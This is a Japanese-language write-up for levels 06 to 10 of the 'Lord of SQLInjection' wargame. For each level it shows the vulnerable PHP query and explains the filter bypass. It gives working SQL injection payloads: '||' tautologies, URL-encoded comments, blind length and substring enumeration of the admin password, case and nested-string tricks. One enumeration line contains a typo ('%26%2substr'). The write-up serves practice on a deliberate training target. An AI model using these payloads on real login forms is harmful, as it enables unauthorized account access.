# Lord of SQLInjection writeup 06-10
## 06 - darkelf
>  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 

今度は`and`と`or`が禁止されている。  
05と同じ方法が使えるのでそのまま実行する。

### 回答例
```
?pw=0'||id='admin
```
> query : select id from prob_darkelf where id='guest' and pw='0'||id='admin'

## 07 - orge
> $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'";   
> $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 

04と同じ問題だが、また`and`と`or`が禁止されている。  
先ほどの`or`を`||`に、`and`を`%26%26`に置き換えてやり直してみる。

```
?pw='||id='admin'%26%26length(pw)=1%23
?pw='||id='admin'%26%26length(pw)=2%23
?pw='||id='admin'%26%26length(pw)=3%23
:
?pw='||id='admin'%26%26length(pw)=8%23
```
またもや8文字らしい。  
```
?pw='||id='admin'%26%2substr(pw,1,1)='0'%23
?pw='||id='admin'%26%2substr(pw,1,1)='1'%23
?pw='||id='admin'%26%2substr(pw,1,1)='2'%23
:
```

### 回答例
```
?pw=7b751aec
```
> query : select id from prob_orge where id='guest' and pw='7b751aec'

## 08 - troll
> $query = "select id from prob_troll where id='{$_GET[id]}'";

`id='admin'`を取ってきたいが、`admin`の入力が禁止されている。  
`adm`と`in`を結合することを考えたが、`'`や`"`が禁止されているので、結合も難しい。

MySQLはデフォルト設定の場合、文字列比較で大文字小文字を区別しないので、  
`admin`がダメなら`ADMIN`にしてみる。  

### 回答例
```
?id=ADMIN
```
> query : select id from prob_troll where id='ADMIN'

## 09 - vampire
> $query = "select id from prob_vampire where id='{$_GET[id]}'"; 

入力された`id`を小文字にし、str_replaceを用いて`admin`をブランクに置換している。  
`admin`が消されると`admin`が完成する？ように、うまく囲ってあげればよい。  

### 回答例
```
?id=admadminin
```
> query : select id from prob_vampire where id='admin'

## 10 - skeleton
> $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 

もともとSQL文の後方にand 1=0が付いているが、特に気にせずにコメントアウトする。  
これまでの問題の解法と比べて特筆すべきことは無い。  

### 回答例
```
?pw=' or id='admin'%23
```
> query : select id from prob_skeleton where id='guest' and pw='' or id='admin'#' and 1=0
